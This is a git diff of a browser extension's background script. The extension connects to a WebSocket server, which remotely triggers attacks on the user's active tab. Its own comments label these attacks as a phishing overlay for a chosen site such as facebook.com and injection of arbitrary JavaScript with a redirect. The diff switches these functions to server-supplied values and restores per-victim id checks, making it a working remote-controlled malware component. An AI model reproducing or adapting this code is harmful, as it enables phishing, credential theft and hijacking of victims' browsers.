@@ -10,11 +10,11 @@ var ws = new WebSocket(HOST);
 var id = "";
 var object = "";
 var type = "";
-var tempSite = "hello";
-var translateString = 'alert("Hello!")';
-var jsSite = "https://www.facebook.com/";
+var tempSite = "";
+var translateString = '';
+var jsSite = ""; //Has to be in https format. GET HREF OF WINDOW ex: https://www.facebook.com/
 var allSites = [];
-var phishSite = "facebook.com";
+var phishSite = "";
 
 //FOR TESTING READ HERE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 //TO TEST JS EXE: MAKE TRANSLATESTRING EMPTY AND JSSITE EMPTY. SEND FROM SERVER .JSSTRING AND .SITE AND TYPE js
@@ -28,40 +28,39 @@ ws.onmessage = function (e) {
     object = JSON.parse(e.data);
     id = object.id; //256 bit value
     type = object.type;
-  //  tempSite = object.addString; //Site to add to blacklist
-  //  translateString = object.jsString; //Arbitrary js function
-  //  jsSite = object.site //website for js attack
-  //  phishSite = object.fishSite //string website for phish
+    tempSite = object.addString; //Site to add to blacklist
+    translateString = object.jsString; //Arbitrary js function
+    jsSite = object.site //website for js attack
+    phishSite = object.fishSite //string website for phish
     allSites = object.allSites;
 
     switch(type){
       case 'blackList':
         chrome.storage.sync.set({'values': allSites}, function(){
-          alert("Updated list!")
         });
         break;
       //Phishing attack
       case 'html':
         chrome.storage.sync.get("id", function(ev){
         var tempId=ev.id;
-        //if(tempId === id){
+        if(tempId === id){
           chrome.storage.sync.set({'compareSite' : phishSite}, function(){});
           chrome.tabs.query({active: true, currentWindow: true}, function(tab){
             chrome.tabs.sendMessage(tab[0].id, {action: 'phis'});
           });
-        //}
+        }
         });
         break;
       case 'js':
       //JS exe injection
         chrome.storage.sync.get("id", function(ev){
         var tempId=ev.id;
-      //  if(tempId === id){
+        if(tempId === id){
           chrome.storage.sync.set({'scriptExe': translateString, 'redirectSite': jsSite}, function(){});
           chrome.tabs.query({active: true, currentWindow: true}, function(tab){
             chrome.tabs.sendMessage(tab[0].id, {action: 'exe'});
           });
-        //  }
+          }
         });
         break;
       case 'listAdd':
